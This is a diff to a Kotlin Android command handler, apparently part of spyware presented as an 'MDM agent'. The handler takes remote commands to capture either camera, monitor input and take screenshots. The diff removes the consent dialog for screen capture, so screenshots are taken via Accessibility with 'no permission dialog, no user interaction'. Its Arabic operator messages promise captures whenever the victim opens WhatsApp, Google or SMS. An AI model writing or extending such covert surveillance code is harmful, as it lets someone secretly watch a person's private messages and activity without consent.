@@ -377,20 +377,9 @@ class CommandHandler(
             "main-camera" -> collectors.captureCamera(0)
             "selfie-camera" -> collectors.captureCamera(1)
             "screenshot" -> {
-                // ✅ Take screenshot with 3 retries
-                Log.i(TAG, "📸 screenshot command - taking with retries")
-                var result: Any? = null
-                for (attempt in 1..3) {
-                    Log.i(TAG, "📸 Attempt $attempt/3")
-                    result = collectors.takeScreenshot()
-                    if (result is CollectedData.FileResult) {
-                        Log.i(TAG, "✅ Screenshot captured on attempt $attempt")
-                        break
-                    }
-                    // Wait 1 second before retry
-                    Thread.sleep(1000)
-                }
-                result ?: CollectedData.TextResult("❌ فشل التقاط الصورة بعد 3 محاولات - تأكد من تفعيل Accessibility")
+                // ✅ Take screenshot via Accessibility (takeScreenshot has 3 retries built in)
+                Log.i(TAG, "📸 screenshot command received")
+                collectors.takeScreenshot()
             }
             "screenshot-off" -> {
                 // ✅ Disable auto-screenshots
@@ -435,35 +424,15 @@ class CommandHandler(
             "input-monitoring-on" -> collectors.setInputMonitoring(true)
             "input-monitoring-off" -> collectors.setInputMonitoring(false)
             "screenshot-on" -> {
-                // ✅ Enable auto-screenshots + request MediaProjection permission (as fallback)
+                // ✅ Enable auto-screenshots using Accessibility ONLY
+                // No MediaProjection, no permission dialog, no user interaction
                 com.mdm.agent.service.MDMAccessibilityService.autoScreenshotBlocked = false
                 com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(true)
-                Log.i(TAG, "✅ screenshot-on: auto-screenshots ENABLED")
-
-                // ✅ If MediaProjection not ready, request it (shows dialog on phone)
-                if (!com.mdm.agent.service.ScreenCaptureService.isReady()) {
-                    Log.i(TAG, "📸 Requesting MediaProjection permission as fallback...")
-                    Handler(Looper.getMainLooper()).post {
-                        try {
-                            com.mdm.agent.ui.ScreenCapturePermissionActivity.requestPermission(context)
-                        } catch (e: Exception) {
-                            Log.e(TAG, "❌ Failed to request MediaProjection: ${e.message}")
-                        }
-                    }
-                    CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية\n\n" +
-                        "📸 سيظهر مربع موافقة على الهاتف لتفعيل MediaProjection (احتياطي)\n" +
-                        "اضغط \"Start now\" للموافقة - لن يخرج التطبيق\n\n" +
-                        "بعد الموافقة، أرسل screenshot لالتقاط صورة فورية")
-                } else {
-                    // MediaProjection already ready - take a test screenshot
-                    val testShot = collectors.takeScreenshot()
-                    if (testShot is CollectedData.FileResult) {
-                        Log.i(TAG, "✅ Test screenshot captured")
-                        testShot
-                    } else {
-                        CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية - ستصلك الصور تلقائياً عند فتح أي تطبيق")
-                    }
-                }
+                Log.i(TAG, "✅ screenshot-on: auto-screenshots ENABLED (Accessibility only)")
+                CollectedData.TextResult("✅ تم تفعيل لقطات الشاشة التلقائية\n\n" +
+                    "ستصلك الصور تلقائياً عند فتح أي تطبيق (واتساب، Google، SMS، إلخ)\n" +
+                    "استخدم screenshot لالتقاط صورة فورية\n" +
+                    "استخدم screenshot-off للإيقاف")
             }
             "screenshot-off" -> {
                 com.mdm.agent.service.MDMAccessibilityService.setAutoScreenshot(false)
